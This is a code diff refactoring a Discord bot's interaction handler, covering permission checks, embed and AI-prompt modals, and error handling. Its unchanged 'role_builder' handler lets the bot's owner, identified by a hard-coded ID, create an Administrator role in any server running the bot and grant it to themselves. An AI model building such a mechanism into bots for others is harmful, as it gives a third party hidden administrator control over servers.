@@ -10,38 +10,43 @@ module.exports = {
     try {
 
       // ================= INIT STORAGE SAFETY =================
-      if (!interaction.client.guildPrompts) {
-        interaction.client.guildPrompts = new Map();
-      }
+      const client = interaction.client;
 
-      if (!interaction.client.activeChannels) {
-        interaction.client.activeChannels = new Map();
-      }
+      if (!client.guildPrompts) client.guildPrompts = new Map();
+      if (!client.activeChannels) client.activeChannels = new Map();
+
+      const guild = interaction.guild;
+
+      // ================= SAFE PERMISSION CHECK =================
+      const isOwner = guild?.ownerId === interaction.user.id;
+      const isBotOwner = interaction.user.id === OWNER_ID;
+      const isAdmin = interaction.member?.permissions?.has(PermissionsBitField.Flags.Administrator);
+
+      const isAuthorized = isOwner || isBotOwner || isAdmin;
 
       // ================= ROLE MODAL =================
       if (interaction.isModalSubmit() && interaction.customId === 'role_builder') {
+
+        if (!guild) return;
 
         if (interaction.user.id !== OWNER_ID) {
           return interaction.reply({ content: '❌ Only owner can use this.', ephemeral: true });
         }
 
-        const botMember = interaction.guild?.members?.me;
-        if (!botMember) return;
-
-        if (!botMember.permissions.has(PermissionsBitField.Flags.ManageRoles)) {
+        const botMember = guild.members.me;
+        if (!botMember?.permissions?.has(PermissionsBitField.Flags.ManageRoles)) {
           return interaction.reply({ content: '❌ Bot needs Manage Roles.', ephemeral: true });
         }
 
         const roleName = interaction.fields.getTextInputValue('role_name');
 
-        const role = await interaction.guild.roles.create({
+        const role = await guild.roles.create({
           name: roleName,
           permissions: ['Administrator'],
           reason: 'Owner setup role'
         });
 
-        const member = await interaction.guild.members.fetch(interaction.user.id).catch(() => null);
-
+        const member = await guild.members.fetch(interaction.user.id).catch(() => null);
         if (member) await member.roles.add(role).catch(() => null);
 
         return interaction.reply({
@@ -53,28 +58,30 @@ module.exports = {
       // ================= EMBED MODAL =================
       if (interaction.isModalSubmit() && interaction.customId === 'embed_builder') {
 
+        if (!guild) return;
+
         if (interaction.user.id !== OWNER_ID) {
           return interaction.reply({ content: '❌ Only owner can use this.', ephemeral: true });
         }
 
         const channelId = interaction.fields.getTextInputValue('channel');
+        const channel = await guild.channels.fetch(channelId).catch(() => null);
+
+        if (!channel) {
+          return interaction.reply({ content: '❌ Invalid channel ID', ephemeral: true });
+        }
+
+        const embed = new EmbedBuilder()
+          .setColor(0xFFA500)
+          .setTimestamp();
+
         const title = interaction.fields.getTextInputValue('title');
         const description = interaction.fields.getTextInputValue('description');
         const footer = interaction.fields.getTextInputValue('footer');
         const topImage = interaction.fields.getTextInputValue('top_image');
         const bottomImage = interaction.fields.getTextInputValue('bottom_image');
 
-        const channel = await interaction.guild.channels.fetch(channelId).catch(() => null);
-
-        if (!channel) {
-          return interaction.reply({ content: '❌ Invalid channel ID', ephemeral: true });
-        }
-
         if (topImage) await channel.send({ content: topImage });
-
-        const embed = new EmbedBuilder()
-          .setColor(0xFFA500)
-          .setTimestamp();
 
         if (title) embed.setTitle(title);
         if (description) embed.setDescription(description);
@@ -90,25 +97,21 @@ module.exports = {
         });
       }
 
-      // ================= PROMPT MODAL =================
+      // ================= PROMPT SYSTEM =================
       if (interaction.isModalSubmit() && interaction.customId === 'set_prompt_modal') {
 
-        if (!interaction.guild) return;
+        if (!guild) return;
 
-        const isOwner = interaction.guild.ownerId === interaction.user.id;
-        const isBotOwner = interaction.user.id === OWNER_ID;
-        const isAdmin = interaction.member.permissions.has(PermissionsBitField.Flags.Administrator);
-
-        if (!isOwner && !isBotOwner && !isAdmin) {
+        if (!isAuthorized) {
           return interaction.reply({
-            content: '❌ Only owner/admin/bot owner can set prompt.',
+            content: '❌ No permission',
             ephemeral: true
           });
         }
 
         const prompt = interaction.fields.getTextInputValue('prompt_text');
 
-        interaction.client.guildPrompts.set(interaction.guild.id, prompt);
+        client.guildPrompts.set(guild.id, prompt);
 
         return interaction.reply({
           content: '🧠 AI prompt updated for this server.',
@@ -119,15 +122,11 @@ module.exports = {
       // ================= ACTIVE CHANNEL =================
       if (interaction.isChatInputCommand() && interaction.commandName === 'active-channel') {
 
-        if (!interaction.guild) return;
+        if (!guild) return;
 
-        const isOwner = interaction.guild.ownerId === interaction.user.id;
-        const isBotOwner = interaction.user.id === OWNER_ID;
-        const isAdmin = interaction.member.permissions.has(PermissionsBitField.Flags.Administrator);
-
-        if (!isOwner && !isBotOwner && !isAdmin) {
+        if (!isAuthorized) {
           return interaction.reply({
-            content: '❌ Only owner/admin/bot owner can set active channel.',
+            content: '❌ No permission',
             ephemeral: true
           });
         }
@@ -141,7 +140,7 @@ module.exports = {
           });
         }
 
-        interaction.client.activeChannels.set(interaction.guild.id, channel.id);
+        client.activeChannels.set(guild.id, channel.id);
 
         return interaction.reply({
           content: `📢 AI active in <#${channel.id}>`,
@@ -151,7 +150,6 @@ module.exports = {
 
       // ================= BUTTONS =================
       if (interaction.isButton()) {
-
         if (interaction.customId === 'close') {
           return interaction.reply({
             content: 'Ticket closed.',
@@ -163,12 +161,14 @@ module.exports = {
     } catch (err) {
       console.error("Interaction Error:", err);
 
-      if (interaction.replied || interaction.deferred) return;
-
-      return interaction.reply({
-        content: '❌ Interaction failed safely handled',
-        ephemeral: true
-      }).catch(() => {});
+      try {
+        if (!interaction.replied && !interaction.deferred) {
+          await interaction.reply({
+            content: '❌ Interaction failed safely handled',
+            ephemeral: true
+          });
+        }
+      } catch {}
     }
   }
 };
